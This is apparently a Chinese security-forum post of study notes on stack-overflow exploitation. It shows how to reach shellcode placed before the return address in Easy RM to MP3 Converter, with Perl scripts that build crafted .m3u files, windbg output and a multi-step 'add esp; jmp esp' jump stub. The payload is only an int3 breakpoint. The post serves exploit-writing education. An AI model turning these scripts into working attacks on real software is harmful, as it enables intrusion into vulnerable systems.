
# [原创]跳转到shellcode的方法——Exploit编写系列教程学习笔记2

## 1. 前言

在[`[上一篇学习文章](https://bbs.pediy.com/thread-268883.htm)`](https://bbs.pediy.com/thread-268883.htm)中，发生栈溢出后，`retn`语句执行结束，`esp`寄存器几乎直接指向了溢出后的栈空间，因为可以使用`jmp esp`跳转到shellcode执行，但是这只是最理想的情况，也是在学习栈溢出漏洞时，教程中通常会讲解的情况。

而实际情况要复杂的多，更大概率你是无法通过`jmp esp`的方法跳转到shellcode执行的，因此这篇文章主要学习的就是其他各种能够让执行流程转到shellcode的方法。

从我个人的经验和以前的学习经历来看，前几个方法很好理解，而且以前在学习的时候也认真分析过，因此这里不再详细分析，只针对最后一个相对复杂的情况，出于复习和巩固的角度进行详细分析，并将几种方法总结成一张思维导图。

## 2. 思维导图

![图片描述](upload/attach/202108/600394\_2N4ZMP58ZRY3S4D.png)

## 3. shellcode分为多块

这个方法针对的是溢出返回地址后，没有足够的空间放置shellcode，需要在shellcode放置在溢出的返回地址之前的情况。

仍旧使用上一篇文章中的Easy RM to MP3 Converter这个程序，在上一篇文章的实验中，覆盖完返回地址，有一大块空间可以用来放置shellcode，这里需要模拟假设返回地址后只有50字节的空间可用，而在返回地址之前，根据实验结果知道可以放置26090字节的数据。现在首先要确定的就是是否可以在栈中找到这26090字节的数据。

### 3.1 确定数据位置

使用如下`perl`脚本生成测试文件：

```perl
my $file= "test1.m3u";
my $pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"; # 用于定位
my $junk= "A" x 25090;
my $eip= "BBBB";
my $beforeshellcode = "X" x 54; # 返回后ESP指向第五个字节，假设后面只能放入50字节数据
my $nop = "\x90" x 230; # 用来区分数据
open($FILE,">$file");
print $FILE $pattern.$junk.$eip.$beforeshellcode.$nop;
close($FILE);
print "m3u File Created successfully\n";
```

其中`$pattern`还是使用`pattern_create.rb`脚本生成的1000字节的数据，用于判断栈中数据具体的起始位置。

打开生成的`test1.m3u`文件之后，`windbg`中断在`0x42424242`，和脚本中的`eip`数据相符，看一下栈中的数据：

```perl
0:000> dc esp l50
000ffd38 58585858 58585858 58585858 58585858 XXXXXXXXXXXXXXXX
000ffd48 58585858 58585858 58585858 58585858 XXXXXXXXXXXXXXXX
000ffd58 58585858 58585858 58585858 58585858 XXXXXXXXXXXXXXXX
000ffd68 90905858 90909090 90909090 90909090 XX..............
000ffd78 90909090 90909090 90909090 90909090 ................
000ffd88 90909090 90909090 90909090 90909090 ................
000ffd98 90909090 90909090 90909090 90909090 ................
000ffda8 90909090 90909090 90909090 90909090 ................
000ffdb8 90909090 90909090 90909090 90909090 ................
000ffdc8 90909090 90909090 90909090 90909090 ................
000ffdd8 90909090 90909090 90909090 90909090 ................
000ffde8 90909090 90909090 90909090 90909090 ................
000ffdf8 90909090 90909090 90909090 90909090 ................
000ffe08 90909090 90909090 90909090 90909090 ................
000ffe18 90909090 90909090 90909090 90909090 ................
000ffe28 90909090 90909090 90909090 90909090 ................
000ffe38 90909090 90909090 90909090 90909090 ................
000ffe48 90909090 90909090 69413500 37694136 .........5Ai6Ai7
000ffe58 41386941 6a413969 316a4130 41326a41 Ai8Ai9Aj0Aj1Aj2A
000ffe68 6a41336a 356a4134 41366a41 6a41376a j3Aj4Aj5Aj6Aj7Aj
```

可以看到`esp`直接指向了50字节的`“X”`，但是由于模拟这里只能存放50字节的数据，shellcode没办法放在这里，而在`0x000ffe50`处，可以发现属于前面`$pattern`内的数据，起始四个字节为`5Ai6`，使用`pattern_offset.rb`，可以确定这四个字节的偏移为257：

```perl
PS E:\metasploit-framework\embedded\framework\tools\exploit> ruby .\pattern\_offset.rb -q 5Ai6 -l 1000
[*] Exact match at offset 257
```

所以我们可以在真正的shellcode放在前面偏移257字节之后，然后在返回地址后面的50个字节中存放跳转指令，跳转到真正的shellcode执行。

实际情况中，可以不必准确的放在257字节偏移，而是可以在前面再放置一些`nop`指令，这样在确定跳转指令的时候，可以允许一些误差。

### 3.2 确定跳转指令

根据上面的输出，在溢出返回地址之后，返回地址处溢出的可以是`jmp esp`指令，然后程序跳转到`0x000ffd38`这里执行指令，这里执行的指令需要再次跳转到`0x000ffe50`之后执行真正的shellcode，也就是说至少要跳转到`esp+280`的位置，即执行`add esp 280; jmp esp`指令。

然后在实际组成跳转指令的时候，不要一次性执行`+280`的操作，因为我们要考虑到整个payload中不能存在`null`字节；同时由于可以在前方插入一定量的`nop`指令，因此实际取值可以大一些。

这里选择做三次加法，每次加`0x5e`，一共增加282字节。使用`a`命令写入汇编命令，最后`Enter`键退出，使用`u`命令查看机器码：

```perl
0:010> a
7c90120e add esp,0x5e
add esp,0x5e
7c901211 add esp,0x5e
add esp,0x5e
7c901214 add esp,0x5e
add esp,0x5e
7c901217 jmp esp
jmp esp
7c901219
0:010> u
ntdll!DbgBreakPoint:
7c90120e 83c45e add esp,5Eh
7c901211 83c45e add esp,5Eh
7c901214 83c45e add esp,5Eh
7c901217 ffe4 jmp esp
7c901219 04cc add al,0CCh
7c90121b c20400 ret 4
ntdll!__NtCurrentTeb:
7c90121e 64a118000000 mov eax,dword ptr fs:[00000018h]
7c901224 c3 ret
```

所以在返回地址之后的部分，可以放入机器指令：`83c45e 83c45e 83c45e ffe4`

### 3.3 替换eip

在上面已经说了，需要覆盖返回地址，让其跳转执行`jmp esp`指令，在上一篇文章中，我们已经找到了一个合适的`jmp esp`指令的地址`0227135b`。

### 3.4 测试

最终使用的`perl`脚本：

```perl
my $file= "test.m3u";
my $buffersize = 26090;
my $junk= "A" x 257;
my $nop = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
my $shellcode = "\xcc";
my $buffer = "A" x ($buffersize - (length($junk)+length($nop)+length($shellcode)));
my $eip= pack('V',0x0227135b);
my $preshellcode = "X" x 4;
my $jmpcode = "\x83\xc4\x5e\x83\xc4\x5e\x83\xc4\x5e\xff\xe4";
open($FILE,">$file");
print $FILE $junk.$nop.$shellcode.$buffer.$eip.$preshellcode.$jmpcode;
close($FILE);
print "m3u File Created successfully\n";
```

最终可以正常执行到shellcode的位置：

```perl
(66c.a40): Break instruction exception - code 80000003 (!!! second chance !!!)
eax=00000001 ebx=00104a58 ecx=7c91003d edx=00a90000 esi=77c5fce0 edi=000065fd
eip=000ffe5f esp=000ffe52 ebp=00104678 iopl=0 nv up ei pl nz ac po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000212
000ffe5f cc int 3
```

## 4. [n]pop及add esp, xx的替代品

如果可利用的空间很小，没有办法存放那么多的`pop`指令，这个时候就可以使用`popad`指令进行替代，`popad`指令会一次弹出`EDI`, `ESI`, `EBP`, `EBX`, `EDX`, `ECX`, 和`EAX`寄存器的值，执行的操作如下：

```perl
IF 64-Bit Mode
THEN
#UD;
ELSE
IF OperandSize = 32 (* Instruction = POPAD *)
THEN
EDI ← Pop();
ESI ← Pop();
EBP ← Pop();
Increment ESP by 4; (* Skip next 4 bytes of stack *)
EBX ← Pop();
EDX ← Pop();
ECX ← Pop();
EAX ← Pop();
ELSE (* OperandSize = 16, instruction = POPA *)
DI ← Pop();
SI ← Pop();
BP ← Pop();
Increment ESP by 2; (* Skip next 2 bytes of stack *)
BX ← Pop();
DX ← Pop();
CX ← Pop();
AX ← Pop();
FI;
FI;
```

也就是说，每次的`popad`都会让`esp`增加32，而`popad`的机器码为`0x61`，有效的减少了使用空间。

## 5. 参考资料

1. <a href="elink@328K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2U0L8%4u0W2L8r3q4F1i4K6u0W2j5X3g2Q4x3V1k6A6L8X3c8W2P5q4)9J5k6i4m8Z5M7q4)9J5c8U0t1H3x3o6W2Q4x3V1j5H3y4#2)9J5c8U0t1K6i4K6u0r3N6%4u0A6N6r3W2F1k6#2)9J5k6r3u0#2k6X3k6W2M7W2)9J5k6r3!0$3k6i4u0X3L8r3!0%4i4K6u0V1k6i4S2H3L8r3!0A6N6s2y4Q4x3X3c8S2i4K6u0V1M7i4g2A6j5$3E0Q4x3X3c8S2L8X3c8Q4x3X3c8T1j5i4y4A6j5#2)9J5k6s2c8#2N6r3!0J5K9h3q4D9i4K6u0V1M7r3q4J5N6q4)9J5k6o6u0Q4x3V1j5`.">Exploit writing tutorial part 2 : Stack Based Overflows – jumping to shellcode</a>

2. <a href="elink@5f5K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4c8Z5k6i4y4@1j5i4u0E0j5h3&6Q4x3X3g2F1j5i4u0G2k6q4)9J5k6i4u0#2i4K6u0r3j5i4y4E0i4K6u0r3x3X3u0&6N6r3g2B7N6h3#2H3M7#2)9J5k6h3S2@1L8b7`.`.">Using SHORT (Two-byte)Relative Jump Instructions</a>
